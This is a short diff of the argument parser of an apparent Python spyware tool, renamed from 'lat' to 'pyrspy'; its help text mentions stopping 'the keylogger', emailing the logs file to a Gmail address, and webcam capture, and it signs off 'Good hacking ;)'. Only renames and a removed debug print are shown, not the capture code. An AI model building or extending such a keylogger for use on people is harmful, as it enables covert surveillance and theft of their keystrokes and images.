@@ -18,7 +18,7 @@ def mail():
 
 # Create main parser
 parser = argparse.ArgumentParser(
-    prog='lat',
+    prog='pyrspy',
     usage='python3 pyrspy.py [OPTIONS] [COMMAND] [COMMAND OPTIONS]',
     formatter_class=argparse.RawDescriptionHelpFormatter,
     description='''
@@ -35,7 +35,7 @@ useful notes: To terminate the keylogger press shift + esc + backspace
     allow_abbrev=False,
     epilog='Good hacking ;)')
 
-# LAT arguments
+# pyRSPY arguments
 parser.add_argument(
     '-P', '--path',
     metavar='path',
@@ -53,7 +53,7 @@ parser.add_argument(
     metavar=('path', 'gmail'),
     help='sends the logs file via email')
 
-parser.version = 'LAT 1.0'
+parser.version = 'pyrspy 1.0'
 parser.add_argument(
     '-V', '--version',
     action='version',
@@ -127,8 +127,6 @@ webcam_parser.add_argument(
 
 # Parse the arguments
 args = parser.parse_args()
-
-print(args)
 
 # No arguments checking
 if len(sys.argv) < 2:
